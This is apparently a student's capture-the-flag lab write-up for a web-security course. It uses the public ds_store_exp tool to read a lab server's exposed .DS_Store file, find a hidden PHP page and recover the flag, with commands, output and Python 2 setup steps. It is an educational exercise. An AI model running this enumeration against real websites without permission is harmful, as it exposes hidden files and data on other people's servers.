---
title: Simple Web 0x02(Lab - `.DS_Store`)
tags: [NTUSTWS, CTF, Web]

category: "Security/Course/NTUST WS/Information Leak"
---

# Simple Web 0x02(Lab - `.DS_Store`)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:9001/

## Exploit - `.DS_Store`
Clone  `lijiejie/ds_store_exp`
```bash!
$ git clone https://github.com/lijiejie/ds_store_exp.git
$ python ds_store_exp.py http://h4ck3r.quest:9001/.DS_Store
[200] http://h4ck3r.quest:9001/.DS_Store
[200] http://h4ck3r.quest:9001/super_secret_meowmeow.php
[200] http://h4ck3r.quest:9001/index.php
$ cd h4ck3r.quest_9001
$ cat super_secret_meowmeow.php
FLAG{.DS_Store is so annoying lmao}
```
* Note that, must install `python 2`, `requests`, `ds_store` and modify `queue`(`import queue`→`import Queue as queue`)
    ```bash!
    $ conda create --name py2.7 python=2.7
    $ conda install -c auto ds_store
    $ conda install -c anaconda requests
    ```

## Reference
[python-no-module-named-queue](https://bobbyhadz.com/blog/python-no-module-named-queue)